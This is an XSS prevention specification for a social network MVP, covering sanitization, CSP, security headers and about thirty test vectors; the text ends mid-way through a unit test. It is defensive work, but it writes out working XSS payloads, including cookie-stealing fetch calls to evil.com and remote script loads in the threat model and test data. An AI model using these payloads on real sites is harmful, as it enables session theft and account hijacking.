# XSS Prevention Specification
## Community Social Network MVP - Security Requirements

**Document Version**: 1.0.0
**Created By**: QE Security Scanner Agent
**Date**: 2025-12-04
**Status**: ⚠️ CRITICAL - MUST IMPLEMENT BEFORE PRODUCTION
**Related Issue**: Validation Report Critical Issue #3
**Affected Milestones**: M3 (Posts), M4 (Comments), M2 (Profiles), M5 (Groups)

---

## Executive Summary

This document specifies comprehensive Cross-Site Scripting (XSS) prevention requirements for the Community Social Network. XSS attacks are **consistently ranked in OWASP Top 10** and pose critical risks:

- **Account Hijacking**: Attacker steals session tokens via malicious scripts
- **Data Theft**: Unauthorized access to user profiles, posts, private messages
- **Malware Distribution**: Self-propagating XSS worms (Samy worm precedent)
- **Phishing**: Fake login forms injected into trusted pages
- **Reputation Damage**: Community trust erosion, legal liability

**Implementation Priority**: CRITICAL
**Estimated Effort**: 1 day (8 hours)
**Testing Effort**: 2 days (30+ test scenarios)

---

## Table of Contents

1. [Threat Model](#threat-model)
2. [Input Sanitization Requirements](#input-sanitization-requirements)
3. [Output Encoding Requirements](#output-encoding-requirements)
4. [Content Security Policy (CSP)](#content-security-policy-csp)
5. [Security Headers](#security-headers)
6. [Test Scenarios](#test-scenarios)
7. [OWASP Compliance Mapping](#owasp-compliance-mapping)
8. [Implementation Guidelines](#implementation-guidelines)
9. [Monitoring & Incident Response](#monitoring--incident-response)

---

## Threat Model

### Attack Vectors

#### 1. Stored XSS (Persistent)
**Likelihood**: HIGH
**Impact**: CRITICAL
**Risk Score**: 9.5/10

**Attack Scenario**:
```javascript
// Malicious post content stored in database
POST /api/posts
{
  "content": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"
}

// When other users view this post, their cookies are stolen
```

**Affected Features**:
- Post content (M3)
- Comment content (M4)
- User bio (M2)
- Group descriptions (M5)
- User display names (M2)

#### 2. Reflected XSS
**Likelihood**: MEDIUM
**Impact**: HIGH
**Risk Score**: 7.5/10

**Attack Scenario**:
```javascript
// Malicious link sent via phishing email
https://community.startit.rs/search?q=<script>alert(document.cookie)</script>

// Search query rendered without sanitization
<div>Search results for: <script>alert(document.cookie)</script></div>
```

**Affected Features**:
- Search functionality
- Error messages
- URL parameters in redirects

#### 3. DOM-Based XSS
**Likelihood**: MEDIUM
**Impact**: HIGH
**Risk Score**: 7.0/10

**Attack Scenario**:
```javascript
// URL fragment manipulated
https://community.startit.rs/#<img src=x onerror=alert(1)>

// Client-side JavaScript reads fragment unsafely
document.getElementById('content').innerHTML = location.hash.substr(1);
```

**Affected Features**:
- Client-side routing (React Router)
- Dynamic DOM manipulation
- Third-party JavaScript libraries

#### 4. SVG/Image-Based XSS
**Likelihood**: LOW
**Impact**: HIGH
**Risk Score**: 6.0/10

**Attack Scenario**:
```xml
<!-- Malicious SVG uploaded as profile picture -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
</svg>
```

**Affected Features**:
- Profile picture uploads (M2)
- Image uploads in posts (M3)

---

## Input Sanitization Requirements

### SR-XSS-001: Server-Side Sanitization Library

**Requirement**: ALL user-generated content MUST be sanitized on the server before storage.

**Implementation**:
```typescript
// Backend: Install DOMPurify (server-side)
npm install isomorphic-dompurify

// Sanitization middleware
import DOMPurify from 'isomorphic-dompurify';

function sanitizeInput(input: string, allowHtml: boolean = false): string {
  if (!allowHtml) {
    // Strip ALL HTML tags
    return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
  }

  // Allow only safe HTML tags (for rich text)
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false,
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):)/i
  });
}
```

**Acceptance Criteria**:
- ✅ AC-XSS-001: DOMPurify sanitizes ALL user input before database storage
- ✅ AC-XSS-002: Sanitization strips `<script>`, `<iframe>`, `<object>`, `<embed>` tags
- ✅ AC-XSS-003: Sanitization removes `javascript:`, `data:`, `vbscript:` protocols
- ✅ AC-XSS-004: Sanitization removes event handlers (`onclick`, `onerror`, `onload`)
- ✅ AC-XSS-005: Configuration is unit tested with 30+ XSS vectors

**Performance Target**:
- Sanitization latency: p95 < 5ms per input field
- Throughput: 10,000+ sanitizations/second

---

### SR-XSS-002: Content-Specific Sanitization Rules

**Requirement**: Different content types require different sanitization levels.

| Content Type | HTML Allowed? | Max Length | Sanitization Level | Test Scenarios |
|-------------|---------------|------------|-------------------|----------------|
| **Post Content** | ✅ Limited | 10,000 chars | Allowlist: `<b>, <i>, <u>, <a>, <p>, <br>` | 15 |
| **Comment Content** | ✅ Limited | 2,000 chars | Allowlist: `<b>, <i>, <u>, <a>` | 12 |
| **User Bio** | ❌ Plain text | 500 chars | Strip ALL HTML | 10 |
| **Group Description** | ✅ Limited | 1,000 chars | Allowlist: `<b>, <i>, <u>, <a>, <p>, <br>` | 12 |
| **Display Name** | ❌ Plain text | 50 chars | Strip ALL HTML, no emojis in production MVP | 8 |
| **Username** | ❌ Alphanumeric | 20 chars | Regex: `^[a-zA-Z0-9_]+$` | 5 |
| **Search Query** | ❌ Plain text | 200 chars | Strip ALL HTML | 8 |
| **Error Messages** | ❌ Plain text | N/A | Backend-controlled, no user input | 5 |

**Acceptance Criteria**:
- ✅ AC-XSS-006: Each content type has dedicated sanitization function
- ✅ AC-XSS-007: Sanitization configuration is stored in `config/sanitization.ts`
- ✅ AC-XSS-008: Unit tests cover ALL content types with malicious payloads

**Implementation Example**:
```typescript
// config/sanitization.ts
export const SANITIZATION_CONFIG = {
  postContent: {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?:\/\/)/i,
    MAX_LENGTH: 10000
  },
  userBio: {
    ALLOWED_TAGS: [],
    MAX_LENGTH: 500
  },
  username: {
    ALLOWED_PATTERN: /^[a-zA-Z0-9_]{3,20}$/,
    MAX_LENGTH: 20
  }
};
```

---

### SR-XSS-003: Client-Side Sanitization (Defense in Depth)

**Requirement**: Client-side sanitization as SECONDARY defense layer (NOT PRIMARY).

**Implementation**:
```typescript
// Frontend: Install DOMPurify
npm install dompurify
npm install @types/dompurify --save-dev

// React component with sanitization
import DOMPurify from 'dompurify';

function PostContent({ content }: { content: string }) {
  // Sanitize before rendering (even though backend already did)
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target']
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Acceptance Criteria**:
- ✅ AC-XSS-009: Client-side DOMPurify installed and configured
- ✅ AC-XSS-010: React components use `dangerouslySetInnerHTML` ONLY with sanitized content
- ✅ AC-XSS-011: ESLint rule enforces sanitization before `dangerouslySetInnerHTML`

**ESLint Configuration**:
```javascript
// .eslintrc.js
{
  "rules": {
    "react/no-danger": "warn", // Warn on dangerouslySetInnerHTML usage
    "no-eval": "error",
    "no-implied-eval": "error"
  }
}
```

---

### SR-XSS-004: URL Validation

**Requirement**: ALL user-provided URLs MUST be validated to prevent `javascript:` protocol injection.

**Implementation**:
```typescript
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    // Only allow http and https protocols
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Usage in link sanitization
function sanitizeLink(href: string): string | null {
  if (!isValidUrl(href)) {
    return null; // Remove invalid links
  }
  return href;
}
```

**Acceptance Criteria**:
- ✅ AC-XSS-012: URL validation rejects `javascript:`, `data:`, `vbscript:`, `file:` protocols
- ✅ AC-XSS-013: Only `http:` and `https:` protocols are allowed
- ✅ AC-XSS-014: Invalid URLs are removed from sanitized content

**Test Vectors**:
```javascript
// Should be REJECTED
"javascript:alert(1)"
"data:text/html,<script>alert(1)</script>"
"vbscript:msgbox(1)"
"file:///etc/passwd"

// Should be ALLOWED
"https://example.com"
"http://localhost:3000" (dev only)
```

---

## Output Encoding Requirements

### SR-XSS-005: Template Engine Configuration

**Requirement**: React's JSX auto-escaping MUST be enabled (default behavior).

**Verification**:
```typescript
// ✅ SAFE: React automatically escapes
function UserProfile({ bio }: { bio: string }) {
  return <div>{bio}</div>; // Automatically escaped
}

// ❌ UNSAFE: Manual HTML rendering
function UnsafeProfile({ bio }: { bio: string }) {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />; // MUST sanitize first!
}
```

**Acceptance Criteria**:
- ✅ AC-XSS-015: React JSX is used for ALL dynamic content rendering
- ✅ AC-XSS-016: `dangerouslySetInnerHTML` is used ONLY for sanitized rich text
- ✅ AC-XSS-017: Code review checklist includes XSS audit for `dangerouslySetInnerHTML`

---

### SR-XSS-006: Context-Aware Encoding

**Requirement**: Output encoding MUST match the context (HTML, JavaScript, URL, CSS).

| Context | Encoding Function | Example |
|---------|------------------|---------|
| **HTML Content** | React auto-escape | `<div>{userInput}</div>` |
| **HTML Attribute** | React auto-escape | `<img alt={userInput} />` |
| **JavaScript** | JSON.stringify | `const data = ${JSON.stringify(userInput)};` |
| **URL Parameter** | encodeURIComponent | `?q=${encodeURIComponent(query)}` |
| **CSS** | Disallow user input | ❌ NEVER allow user input in CSS |

**Acceptance Criteria**:
- ✅ AC-XSS-018: User input is NEVER interpolated into `<script>` tags
- ✅ AC-XSS-019: User input is NEVER interpolated into `<style>` tags
- ✅ AC-XSS-020: URL encoding uses `encodeURIComponent`, NOT `escape()`

**Implementation Example**:
```typescript
// ✅ SAFE: Context-aware encoding
function SearchResults({ query }: { query: string }) {
  const encodedQuery = encodeURIComponent(query);
  return (
    <>
      <h1>Search Results for: {query}</h1> {/* React auto-escapes */}
      <a href={`/search?q=${encodedQuery}`}>Refine Search</a>
    </>
  );
}

// ❌ UNSAFE: User input in JavaScript context
function UnsafeAnalytics({ userId }: { userId: string }) {
  return (
    <script>
      {`trackUser('${userId}');`} // XSS if userId contains '
    </script>
  );
}

// ✅ SAFE: Use JSON.stringify for JavaScript context
function SafeAnalytics({ userId }: { userId: string }) {
  return (
    <script>
      {`trackUser(${JSON.stringify(userId)});`}
    </script>
  );
}
```

---

## Content Security Policy (CSP)

### SR-XSS-007: CSP Header Configuration

**Requirement**: MUST implement strict Content Security Policy to mitigate XSS impact.

**Implementation** (Express.js):
```typescript
// middleware/security.ts
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'nonce-{RANDOM_NONCE}'", // Generated per request
        "https://cdn.jsdelivr.net", // For libraries (if needed)
      ],
      styleSrc: [
        "'self'",
        "'nonce-{RANDOM_NONCE}'",
        "https://fonts.googleapis.com",
      ],
      imgSrc: [
        "'self'",
        "data:", // For base64 images
        "https://s3.amazonaws.com", // S3 bucket for user uploads
        "https://*.cloudfront.net", // CDN
      ],
      fontSrc: [
        "'self'",
        "https://fonts.gstatic.com",
      ],
      connectSrc: [
        "'self'",
        "https://api.startit.rs", // API endpoint
        "wss://api.startit.rs", // WebSocket
      ],
      frameSrc: ["'none'"], // Disallow iframes
      objectSrc: ["'none'"], // Disallow plugins
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: [], // Force HTTPS
      reportUri: "/api/csp-report", // Log violations
    },
  })
);
```

**Acceptance Criteria**:
- ✅ AC-XSS-021: CSP header is present in ALL HTTP responses
- ✅ AC-XSS-022: `script-src` uses nonce-based whitelist (NO `unsafe-inline`)
- ✅ AC-XSS-023: `object-src 'none'` disables Flash and other plugins
- ✅ AC-XSS-024: `base-uri 'self'` prevents base tag injection
- ✅ AC-XSS-025: CSP violations are logged to `/api/csp-report` endpoint

**CSP Violation Reporting**:
```typescript
// routes/csp-report.ts
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.error('CSP Violation:', req.body);
  // Log to monitoring system (Sentry, CloudWatch)
  logger.warn('CSP violation detected', {
    documentUri: req.body['csp-report']?.['document-uri'],
    violatedDirective: req.body['csp-report']?.['violated-directive'],
    blockedUri: req.body['csp-report']?.['blocked-uri'],
  });
  res.status(204).end();
});
```

---

### SR-XSS-008: Nonce-Based Script Loading

**Requirement**: ALL inline scripts MUST use cryptographically secure nonces.

**Implementation**:
```typescript
// middleware/nonce.ts
import crypto from 'crypto';

app.use((req, res, next) => {
  // Generate random nonce per request
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// In HTML template (server-side rendering)
app.get('/', (req, res) => {
  const nonce = res.locals.cspNonce;
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <script nonce="${nonce}">
          // Safe inline script with nonce
          console.log('App initialized');
        </script>
      </head>
      <body>
        <div id="root"></div>
      </body>
    </html>
  `);
});
```

**Acceptance Criteria**:
- ✅ AC-XSS-026: Nonce is generated using `crypto.randomBytes()` with 128+ bits
- ✅ AC-XSS-027: Nonce is unique per HTTP request
- ✅ AC-XSS-028: ALL inline scripts include `nonce` attribute matching CSP header

---

## Security Headers

### SR-XSS-009: HTTP Security Headers

**Requirement**: MUST implement comprehensive security headers.

**Implementation** (Helmet.js):
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: { /* See SR-XSS-007 */ },

  xContentTypeOptions: true, // X-Content-Type-Options: nosniff

  xFrameOptions: { action: 'deny' }, // X-Frame-Options: DENY

  xXssProtection: true, // X-XSS-Protection: 1; mode=block (legacy)

  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  }
}));
```

**Security Headers Matrix**:

| Header | Value | Purpose | AC-ID |
|--------|-------|---------|-------|
| `Content-Security-Policy` | (See SR-XSS-007) | Mitigate XSS impact | AC-XSS-029 |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing | AC-XSS-030 |
| `X-Frame-Options` | `DENY` | Prevent clickjacking | AC-XSS-031 |
| `X-XSS-Protection` | `1; mode=block` | Legacy XSS filter (IE/Edge) | AC-XSS-032 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limit referrer leakage | AC-XSS-033 |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Force HTTPS | AC-XSS-034 |

**Verification**:
```bash
# Test security headers
curl -I https://community.startit.rs | grep -E "X-|Content-Security|Strict-Transport"
```

---

## Test Scenarios

### TS-XSS-001: Stored XSS Test Vectors (30 Scenarios)

**Test Strategy**: Inject malicious payloads into ALL user input fields, verify sanitization.

#### Category 1: Script Tag Injection (8 scenarios)

```javascript
const SCRIPT_INJECTION_VECTORS = [
  {
    id: 'XSS-001',
    payload: '<script>alert("XSS")</script>',
    expected: 'Text content only (tags stripped)',
    affectedFields: ['postContent', 'comment', 'bio', 'groupDescription']
  },
  {
    id: 'XSS-002',
    payload: '<SCRIPT>alert("XSS")</SCRIPT>',
    expected: 'Case-insensitive sanitization',
    affectedFields: ['postContent', 'comment', 'bio']
  },
  {
    id: 'XSS-003',
    payload: '<script src="https://evil.com/xss.js"></script>',
    expected: 'External script blocked',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-004',
    payload: '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
    expected: 'Cookie theft attempt blocked',
    affectedFields: ['postContent', 'comment', 'bio']
  },
  {
    id: 'XSS-005',
    payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    expected: 'Nested tag attack blocked',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-006',
    payload: '<script\x20type="text/javascript">alert("XSS")</script>',
    expected: 'Null byte injection blocked',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-007',
    payload: '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    expected: 'Recursive sanitization',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-008',
    payload: '`<script>alert("XSS")</script>`',
    expected: 'Template literal escaped',
    affectedFields: ['postContent', 'comment']
  }
];
```

#### Category 2: Event Handler Injection (10 scenarios)

```javascript
const EVENT_HANDLER_VECTORS = [
  {
    id: 'XSS-009',
    payload: '<img src=x onerror="alert(\'XSS\')">',
    expected: 'onerror handler removed',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-010',
    payload: '<body onload="alert(\'XSS\')">',
    expected: 'onload handler removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-011',
    payload: '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    expected: 'onmouseover handler removed',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-012',
    payload: '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
    expected: 'onfocus + autofocus removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-013',
    payload: '<svg onload="alert(\'XSS\')"></svg>',
    expected: 'SVG onload removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-014',
    payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    expected: 'iframe removed entirely',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-015',
    payload: '<object data="javascript:alert(\'XSS\')"></object>',
    expected: 'object tag removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-016',
    payload: '<embed src="javascript:alert(\'XSS\')">',
    expected: 'embed tag removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-017',
    payload: '<a href="javascript:alert(\'XSS\')">Click me</a>',
    expected: 'javascript: protocol removed, link broken',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-018',
    payload: '<form action="javascript:alert(\'XSS\')"><button>Submit</button></form>',
    expected: 'form tag removed',
    affectedFields: ['postContent']
  }
];
```

#### Category 3: Encoding Bypass Attacks (6 scenarios)

```javascript
const ENCODING_BYPASS_VECTORS = [
  {
    id: 'XSS-019',
    payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    expected: 'HTML entity encoding decoded and blocked',
    affectedFields: ['postContent', 'comment']
  },
  {
    id: 'XSS-020',
    payload: '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(\'XSS\')>',
    expected: 'Unicode escape blocked',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-021',
    payload: '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
    expected: 'URL encoding decoded and blocked',
    affectedFields: ['searchQuery', 'urlParams']
  },
  {
    id: 'XSS-022',
    payload: '<img src=x on\nerror="alert(\'XSS\')">',
    expected: 'Newline in attribute blocked',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-023',
    payload: '<img/src/onerror=alert(\'XSS\')>',
    expected: 'Malformed tag blocked',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-024',
    payload: 'javascript&#58;alert(\'XSS\')',
    expected: 'HTML entity in protocol blocked',
    affectedFields: ['postContent']
  }
];
```

#### Category 4: DOM-Based XSS (3 scenarios)

```javascript
const DOM_XSS_VECTORS = [
  {
    id: 'XSS-025',
    payload: '#<img src=x onerror=alert(1)>',
    expected: 'URL fragment sanitized',
    testType: 'Client-side rendering test'
  },
  {
    id: 'XSS-026',
    payload: 'document.location.hash',
    expected: 'Location hash never used in innerHTML',
    testType: 'Code review check'
  },
  {
    id: 'XSS-027',
    payload: 'eval(window.name)',
    expected: 'No eval() or Function() with user input',
    testType: 'Static analysis (ESLint)'
  }
];
```

#### Category 5: SVG/Image-Based XSS (3 scenarios)

```javascript
const SVG_IMAGE_VECTORS = [
  {
    id: 'XSS-028',
    payload: '<svg><script>alert("XSS")</script></svg>',
    expected: 'SVG script tag removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-029',
    payload: '<svg><animate onbegin="alert(\'XSS\')" attributeName="x"></svg>',
    expected: 'SVG animate events removed',
    affectedFields: ['postContent']
  },
  {
    id: 'XSS-030',
    payload: 'data:image/svg+xml,<svg><script>alert("XSS")</script></svg>',
    expected: 'data: URI with SVG blocked',
    affectedFields: ['profilePicture', 'postImages']
  }
];
```

---

### TS-XSS-002: BDD Security Test Scenarios

**File**: `tests/security/xss-prevention.feature`

```gherkin
Feature: XSS Prevention
  As a security engineer
  I want to prevent all XSS attacks
  So that user accounts and data are protected

  Background:
    Given the application is running
    And security middleware is enabled
    And CSP headers are configured
    And DOMPurify is initialized

  Scenario: Stored XSS in post content is prevented
    Given a user "alice@example.com" is authenticated
    When Alice creates a post with content '<script>alert("XSS")</script>'
    Then the post is saved to database
    And the content is sanitized to remove script tags
    And viewing the post does not execute JavaScript
    And response contains text "alert(\"XSS\")" without script tags

  Scenario: Reflected XSS in search query is prevented
    Given a user visits the search page
    When the user searches for '<img src=x onerror=alert(1)>'
    Then the search results page renders safely
    And the search query is HTML-escaped in the display
    And no JavaScript is executed
    And response contains "&lt;img src=x onerror=alert(1)&gt;"

  Scenario: DOM-based XSS via URL fragment is prevented
    Given a user visits the application
    When the user navigates to "/#<img src=x onerror=alert(1)>"
    Then the URL fragment is not rendered as HTML
    And no JavaScript is executed
    And React safely escapes the fragment content

  Scenario: XSS via event handler injection is prevented
    Given a user "bob@example.com" is authenticated
    When Bob creates a post with content '<img src=x onerror="fetch(\"https://evil.com?cookie=\"+document.cookie)">'
    Then the onerror handler is removed during sanitization
    And the post content is saved as '<img src=x>'
    And viewing the post does not send cookies to evil.com

  Scenario: XSS via malicious link is prevented
    Given a user "charlie@example.com" is authenticated
    When Charlie creates a post with link '[Click me](javascript:alert(1))'
    Then the javascript: protocol is removed
    And the link is rendered as broken/disabled
    And clicking the link does not execute JavaScript

  Scenario: SVG-based XSS is prevented
    Given a user "dave@example.com" is authenticated
    When Dave creates a post with SVG content:
      """
      <svg><script>alert("XSS")</script></svg>
      """
    Then the SVG script tag is removed
    And the sanitized SVG is safe to render
    And viewing the post does not execute JavaScript

  Scenario: Content Security Policy blocks inline script execution
    Given CSP header is configured with nonce-based script-src
    When an attacker injects '<script>alert(1)</script>' via XSS
    And the script bypasses sanitization (hypothetically)
    Then the browser blocks the script due to CSP violation
    And a CSP report is sent to /api/csp-report
    And the violation is logged to monitoring system

  Scenario: HTML entity encoding bypass is prevented
    Given a user "eve@example.com" is authenticated
    When Eve creates a post with HTML entities:
      """
      <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
      """
    Then DOMPurify decodes HTML entities before sanitization
    And the onerror handler is detected and removed
    And viewing the post does not execute JavaScript

  Scenario: URL encoding bypass is prevented
    Given a user visits the search page
    When the user searches for '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'
    Then the URL-encoded payload is decoded
    And the decoded script tag is sanitized
    And the search results page is safe
    And no JavaScript is executed

  Scenario: Username validation prevents XSS
    Given a new user tries to register
    When the user submits username '<script>alert(1)</script>'
    Then registration fails with 400 Bad Request
    And error message is "Username must be alphanumeric (a-z, A-Z, 0-9, underscore)"
    And the malicious username is rejected
    And no account is created

  Scenario: User bio sanitization removes all HTML
    Given a user "frank@example.com" is authenticated
    When Frank updates bio to 'I love coding <script>alert(1)</script>'
    Then ALL HTML tags are stripped from bio
    And bio is saved as 'I love coding alert(1)'
    And viewing the profile does not execute JavaScript

  Scenario: Comment thread sanitization
    Given a post with ID "post123" exists
    And user "grace@example.com" is authenticated
    When Grace comments '<img src=x onerror=alert(1)> Nice post!'
    Then the comment is sanitized
    And the img tag is removed
    And comment is saved as ' Nice post!'
    And viewing comments does not execute JavaScript

  Scenario: Group description sanitization allows safe HTML
    Given a user "hank@example.com" is group owner
    When Hank creates group with description:
      """
      Welcome to <b>AI Community</b>!
      <a href="https://startit.rs">Visit our website</a>
      <script>alert(1)</script>
      """
    Then bold and link tags are preserved
    And script tag is removed
    And description is saved as:
      """
      Welcome to <b>AI Community</b>!
      <a href="https://startit.rs">Visit our website</a>
      """
    And viewing group page does not execute JavaScript

  Scenario: X-XSS-Protection header is present (legacy browser protection)
    Given a user visits the application
    When the user receives HTTP response
    Then the response includes header "X-XSS-Protection: 1; mode=block"
    And legacy browsers enable XSS filter

  Scenario: X-Content-Type-Options prevents MIME sniffing
    Given a user uploads an image "malicious.jpg" containing HTML
    When the user views the uploaded image
    Then the response includes header "X-Content-Type-Options: nosniff"
    And the browser respects Content-Type header
    And the file is not interpreted as HTML

  Scenario Outline: XSS payloads from OWASP XSS cheat sheet
    Given a user "tester@example.com" is authenticated
    When the user creates a post with content <payload>
    Then the content is sanitized
    And viewing the post does not execute JavaScript
    And no XSS vulnerability exists

    Examples:
      | payload |
      | '<script>alert(String.fromCharCode(88,83,83))</script>' |
      | '<iframe src=javascript:alert(1)></iframe>' |
      | '<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>' |
      | '<object data="data:text/html,<script>alert(1)</script>">' |
      | '<svg/onload=alert(1)>' |
      | '<img src="x" onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">' |
      | '<input autofocus onfocus=alert(1)>' |
      | '<select onfocus=alert(1) autofocus>' |
      | '<textarea onfocus=alert(1) autofocus>' |
      | '<keygen onfocus=alert(1) autofocus>' |
```

**Acceptance Criteria**:
- ✅ AC-XSS-035: ALL 30 XSS test vectors are automated with Jest/Cucumber
- ✅ AC-XSS-036: BDD scenarios cover stored, reflected, and DOM-based XSS
- ✅ AC-XSS-037: Test suite runs in CI/CD pipeline before deployment
- ✅ AC-XSS-038: 100% of XSS tests pass before production deployment

---

### TS-XSS-003: Manual Security Testing

**Test Plan**:
1. ✅ Use OWASP ZAP automated scan
2. ✅ Manual penetration testing with Burp Suite
3. ✅ Test with XSS payloads from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
4. ✅ Browser DevTools CSP violation monitoring
5. ✅ Third-party security audit (before launch)

---

## OWASP Compliance Mapping

### OWASP XSS Prevention Cheat Sheet Compliance

| Rule | Description | Implementation | Status | AC-ID |
|------|-------------|---------------|--------|-------|
| **Rule #0** | Never insert untrusted data in comments, scripts, or styles | Disallow user input in `<script>` and `<style>` | ✅ | AC-XSS-039 |
| **Rule #1** | HTML encode before inserting untrusted data in HTML element content | React JSX auto-escaping | ✅ | AC-XSS-040 |
| **Rule #2** | Attribute encode before inserting untrusted data into HTML attributes | React JSX auto-escaping | ✅ | AC-XSS-041 |
| **Rule #3** | JavaScript encode before inserting untrusted data into JavaScript | JSON.stringify() | ✅ | AC-XSS-042 |
| **Rule #4** | CSS encode before inserting untrusted data into CSS | ❌ User input NOT allowed in CSS | ✅ | AC-XSS-043 |
| **Rule #5** | URL encode before inserting untrusted data into URL parameters | encodeURIComponent() | ✅ | AC-XSS-044 |
| **Rule #6** | Sanitize HTML before inserting untrusted data into HTML body | DOMPurify with allowlist | ✅ | AC-XSS-045 |
| **Rule #7** | Prevent DOM-based XSS | Avoid innerHTML, use textContent | ✅ | AC-XSS-046 |
| **Bonus Rule #1** | Use HTTPOnly and Secure flags on cookies | Express session config | ✅ | AC-XSS-047 |
| **Bonus Rule #2** | Implement Content Security Policy | Helmet.js CSP middleware | ✅ | AC-XSS-048 |

**Compliance Score**: 10/10 ✅ **FULLY COMPLIANT**

---

### OWASP Top 10 2021 Alignment

**A03:2021 – Injection** (XSS is #1 injection type)

**Mitigations Implemented**:
- ✅ Server-side input validation and sanitization (DOMPurify)
- ✅ Context-aware output encoding (React JSX, JSON.stringify)
- ✅ Parameterized queries (Prisma ORM protects against SQL injection)
- ✅ Content Security Policy (limits XSS impact)

**CWE Mappings**:
- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
- CWE-80: Improper Neutralization of Script-Related HTML Tags
- CWE-83: Improper Neutralization of Script in Attributes
- CWE-87: Improper Neutralization of Alternate XSS Syntax

---

## Implementation Guidelines

### Phase 1: Backend Sanitization (Priority 1)

**Timeline**: 3 hours

**Steps**:
1. ✅ Install dependencies:
   ```bash
   npm install isomorphic-dompurify
   npm install --save-dev @types/dompurify
   ```

2. ✅ Create sanitization utility:
   ```typescript
   // src/utils/sanitization.ts
   import DOMPurify from 'isomorphic-dompurify';
   import { SANITIZATION_CONFIG } from '../config/sanitization';

   export function sanitizePostContent(input: string): string {
     return DOMPurify.sanitize(input, SANITIZATION_CONFIG.postContent);
   }

   export function sanitizeUserBio(input: string): string {
     return DOMPurify.sanitize(input, SANITIZATION_CONFIG.userBio);
   }

   export function sanitizeUsername(input: string): string {
     if (!SANITIZATION_CONFIG.username.ALLOWED_PATTERN.test(input)) {
       throw new Error('Invalid username format');
     }
     return input;
   }
   ```

3. ✅ Apply sanitization in controllers:
   ```typescript
   // src/controllers/postController.ts
   import { sanitizePostContent } from '../utils/sanitization';

   export async function createPost(req: Request, res: Response) {
     const { content } = req.body;
     const sanitizedContent = sanitizePostContent(content);

     const post = await prisma.post.create({
       data: {
         content: sanitizedContent,
         authorId: req.user.id
       }
     });

     res.status(201).json(post);
   }
   ```

4. ✅ Write unit tests:
   ```typescript
   // src/utils/sanitization.test.ts
   import { sanitizePostContent } from './sanitization';

   describe('XSS Sanitization', () => {
     test('removes script tags', () => {
       const input = '<script>alert("XSS")</script>';
       const output = sanitizePostContent(input);
       expect(output).not.toContain('<script>');
     });

     test('removes event handlers', () => {
       const input = '<img src=x onerror=alert(1)>';
       const output = sanitizePostContent(input);
       expect(output).not.toContain('onerror');
     });

